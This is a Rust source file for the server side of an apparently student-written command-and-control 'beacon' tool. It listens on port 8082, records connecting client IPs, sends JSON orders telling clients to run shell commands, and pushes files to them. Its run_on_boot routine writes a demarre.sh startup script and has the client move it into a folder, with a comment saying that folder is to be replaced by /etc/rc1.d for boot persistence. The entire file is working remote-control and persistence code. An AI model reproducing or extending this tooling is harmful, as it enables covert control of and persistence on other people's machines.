use std::{
    fs::{OpenOptions, File},
    io::{prelude::*, BufReader},
    net::{SocketAddr},
};
use chrono::prelude::*;
use tiny_http::{Response};
use serde::{Serialize, Deserialize};  
use std::process::Command;


#[derive(Serialize, Deserialize, Debug, Clone)]
enum OrdreType {
    Commande,
    Fichier,
    Vitesse,
    Autre
}

#[derive(Serialize, Deserialize, Debug)]
struct Ordre {
    ordre: OrdreType,
    arguments: Vec<String>,
}

fn write_incoming_ip(request : Option<&SocketAddr>){
    let fp = "./beacon.txt";
    let does_exist = std::path::Path::new(fp).exists();
    if !does_exist {
        File::create(fp).unwrap();
    }  
    let mut ip = String::from("Unknown IP");
    match request{
        Some(res) => {
            ip = String::from(res.to_string());
            let temp_ip = String::from(res.to_string());
            let split = temp_ip.split(":");
            let mut compteur = true;
            for l in split{
                if compteur{
                    ip = String::from(l);
                    compteur = false;
                }
            }
            println!("{}", ip);
        },
        None => ()
    }
    let file = File::open(fp).unwrap();
    let reader = BufReader::new(file);
    let mut does_exist = false;
    for line in reader.lines() {
        match line {
            Ok(l) => {
                if l.contains(&ip) {
                    does_exist = true;
                }
            },
            Err(_) => {
                println!("error reading lines in file");
            }
        }
    }
    if !does_exist{
        let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file"); 
        file_ref.write_all(ip.as_bytes()).expect("write failed");
        file_ref.write_all(" - active \n".as_bytes()).expect("write failed");
    }
}

fn write_logs(request : Option<&SocketAddr>){
    let fp = "./logs.txt";
    let does_exist = std::path::Path::new(fp).exists();
    if !does_exist {
        File::create(fp).unwrap();
    }
    let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file");   
    file_ref.write_all("Incoming connection from: ".as_bytes()).expect("write failed");
    let mut ip = String::from("Unknown IP");
    match request{
        Some(res) => {
            ip = String::from(res.to_string());
        },
        None => ()
    }
    file_ref.write_all(ip.as_bytes()).expect("write failed");
    file_ref.write_all(" at : ".as_bytes()).expect("write failed");
    let date_as_string = Utc::now().to_string();
    file_ref.write_all(date_as_string.as_bytes()).expect("write failed");
    file_ref.write_all("\n".as_bytes()).expect("write failed");
    println!("Log appended successfully"); 
}

async fn handle_post_request(server: & tiny_http::Server) -> String {

    let request = server.recv();

    match request {
        Ok(mut rq) => {

            if *rq.method() == tiny_http::Method::Post {

                let mut content = String::new();
                rq.as_reader().read_to_string(&mut content).unwrap();
                //print the result of the request
                
                println!("{}", content);
                let response = Response::from_string("Recu requete POST\n");
                rq.respond(response).unwrap();
                return content;
            }
        },
        Err(e) => { println!("error: {}", e);}
    };
    return "".to_string();
}

async fn handle_file_post_request(server: & tiny_http::Server, filename: &str) -> () {

    let request = server.recv();

    match request {
        Ok(rq) => {

            if *rq.method() == tiny_http::Method::Post {
                
                let file = std::fs::File::open(filename).unwrap();

                let mut response = Response::from_file(file);
                let header = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"multipart/form-data"[..]).unwrap();
                response.add_header(header);
                rq.respond(response).unwrap();
            }
        },
        Err(e) => { println!("error: {}", e);  }
    };
}


async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Vec<String>) -> String {
    let request = server.recv();
    match request {
        Ok(rq) => {

            if *rq.method() == tiny_http::Method::Get {

                println!("Incoming connection from: {:?} \n", rq.remote_addr());
                write_incoming_ip(rq.remote_addr());
                write_logs(rq.remote_addr());

                let bod = Ordre { ordre: ordre.clone(), arguments: arguments.clone() };

                let response = Response::from_string(serde_json::to_string(&bod).unwrap());
                rq.respond(response).unwrap();

                match ordre {
                    OrdreType::Commande => {
                        
                        let pwd = String::from(handle_post_request(&server).await);
                        //ligne commenté car recuperer le resultat dans le string appelle la fonction donc double appel si on decommente 
                        //handle_post_request(&server).await;
                        return pwd;
                    },
                    OrdreType::Fichier => {
                        let filename = arguments[0].as_str();
                        handle_file_post_request(&server, filename).await;
                    },
                    _ => ()
                }

            }

        },
        Err(e) => { println!("error: {}", e);  }
    };
    return "".to_string();
}

async fn run_on_boot(server: & tiny_http::Server) -> () {
    //recupere le string de la commande shell pwd : /home/cytech/Desktop/22-23/Rust/cabreBranch/beacon_projet_rust/client
    let resultpwd = String::from(send_ordre(&server, OrdreType::Commande, vec![String::from("pwd"), String::from("")]).await);
    
    //creation du fichier demarre.sh 
    let mut demarre_sh = File::create("demarre.sh").expect("Error encountered while creating file!");

    // écriture dans le fichier
    demarre_sh.write_all(b"#!/bin/bash\ncd ").expect("Error while writing to file");
    demarre_sh.write_all(resultpwd.as_bytes())
    .expect("Error while writing to file");
    demarre_sh.write_all(b"cd ./target/debug && ./client").expect("Error while writing to file");
 
    // Ajoute le chemin du fichier demarre.sh pour le mv plus tard dans /etc
    let owned_string: String = resultpwd.to_owned();
    let borrowed_string: &str = "/demarre.sh";
    let shorten = &owned_string[0..owned_string.len()-1];
    let mut source_file_sh = String::from(shorten);
    let folder: &str = "/src/etc/";
    let mut final_string = String::from(shorten);
    final_string.push_str(folder);
    // final_string = /home/cytech/Desktop/22-23/Rust/cabreBranch/beacon_projet_rust/client/src/etc/

    source_file_sh.push_str(borrowed_string);
    println!("---2--{}-----", shorten);
    // source_file_sh = /home/cytech/Desktop/22-23/Rust/cabreBranch/beacon_projet_rust/client/demarre.sh

    //tempodesti est à remplacer par /etc/rc1.d 
    let tempodesti = String::from(final_string);
    
    //envoie le fichier demarre.sh coté client
    send_ordre(&server, OrdreType::Fichier, vec![String::from("demarre.sh")]).await;

    send_ordre(&server, OrdreType::Commande, vec![String::from("mkdir"), String::from(&tempodesti)] ).await;

    //coté client : lance mv demarrre.sh "tempodest" 
    send_ordre(&server, OrdreType::Commande, vec![String::from("mv"), String::from(source_file_sh), String::from(tempodesti)] ).await;

    let mut delete_sh_file = Command::new("rm");
    delete_sh_file.arg("demarre.sh");
    delete_sh_file.output().expect("failed to execute process");
}

#[tokio::main]
async fn main() {
    let server = tiny_http::Server::http("0.0.0.0:8082").unwrap();
    //////////////////////// Envoie une commande ls pour l'example
    send_ordre(&server, OrdreType::Commande, vec![String::from("ls"), String::from("-l")]).await;
    //////////////////////// envoie un echo pour l'exemple
    send_ordre(&server, OrdreType::Commande, vec![String::from("echo"), String::from("titouan")]).await;
    //////////////////////// envoie un fichier pour l'exemple
    send_ordre(&server, OrdreType::Fichier, vec![String::from("texte.txt")]).await;

    send_ordre(&server, OrdreType::Vitesse, vec![String::from("1")]).await;

    run_on_boot(&server).await;
}